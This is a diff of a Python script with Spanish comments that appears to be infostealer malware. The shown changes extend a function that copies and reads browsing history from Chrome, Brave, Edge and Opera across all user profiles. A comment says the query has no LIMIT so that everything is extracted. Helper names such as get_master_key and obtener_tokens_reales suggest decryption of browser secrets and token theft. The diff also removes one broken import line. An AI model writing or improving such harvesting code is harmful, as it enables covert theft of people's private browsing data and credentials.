@@ -11,7 +11,6 @@ import platform
 import socket
 import sqlite3
 import tempfile
-from Crypto.CipherAES if AES else None # (Mantiene la importación segura)
 from Crypto.Cipher import AES
 
 def get_master_key():
@@ -91,23 +90,24 @@ def obtener_tokens_reales():
                 
     return tokens
 
-######## Historial Multi-Navegador y Multi-Perfil (TXT) ######################
+######## Historial Multi-Navegador y Multi-Perfil (TXT Global sin límites) #
 
 def generar_archivo_historial():
     local_appdata = os.getenv("LOCALAPPDATA")
+    appdata = os.getenv("APPDATA")
     txt_path = os.path.join(tempfile.gettempdir(), "historial_global.txt")
     
-    if not local_appdata:
+    if not local_appdata or not appdata:
         with open(txt_path, "w", encoding="utf-8") as f:
-            f.write("No se pudo acceder a LOCALAPPDATA.")
+            f.write("No se pudieron obtener las rutas de AppData.")
         return txt_path
 
-    # Directorios base de los navegadores basados en Chromium en Windows
+    # Rutas base de navegadores basados en Chromium
     navegadores = {
         "Google Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
         "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
         "Microsoft Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
-        "Opera Software": os.path.join(local_appdata, "Opera Software", "Opera Stable")
+        "Opera Stable": os.path.join(appdata, "Opera Software", "Opera Stable")
     }
 
     temp_dir = tempfile.gettempdir()
@@ -119,27 +119,36 @@ def generar_archivo_historial():
             if not os.path.exists(base_path):
                 continue
 
-            # Buscar perfiles (Default, Profile 1, Profile 2, etc.)
+            # Identificar perfiles disponibles dinámicamente
             perfiles = ["Default"]
             try:
                 for item in os.listdir(base_path):
-                    if item.startswith("Profile ") or item == "Guest Profile":
+                    ruta_item = os.path.join(base_path, item)
+                    if os.path.isdir(ruta_item) and (item.startswith("Profile ") or item == "Guest Profile" or item == "System Profile"):
                         perfiles.append(item)
             except Exception:
                 pass
 
             for perfil in perfiles:
-                history_path = os.path.join(base_path, perfil, "History")
+                # Opera Stable maneja el archivo History directo o dentro de Default
+                if nav_nombre == "Opera Stable":
+                    history_path = os.path.join(base_path, "History")
+                    if not os.path.exists(history_path):
+                        history_path = os.path.join(base_path, perfil, "History")
+                else:
+                    history_path = os.path.join(base_path, perfil, "History")
+
                 if not os.path.exists(history_path):
                     continue
 
-                temp_history = os.path.join(temp_dir, f"history_{nav_nombre}_{perfil}".replace(" ", "_"))
+                temp_history = os.path.join(temp_dir, f"history_{nav_nombre.replace(' ', '_')}_{perfil}")
                 
                 try:
                     shutil.copy2(history_path, temp_history)
                     conn = sqlite3.connect(temp_history)
                     cursor = conn.cursor()
                     
+                    # Consulta sin LIMIT para extraer todo
                     query = """
                         SELECT url, title, last_visit_time 
                         FROM urls 
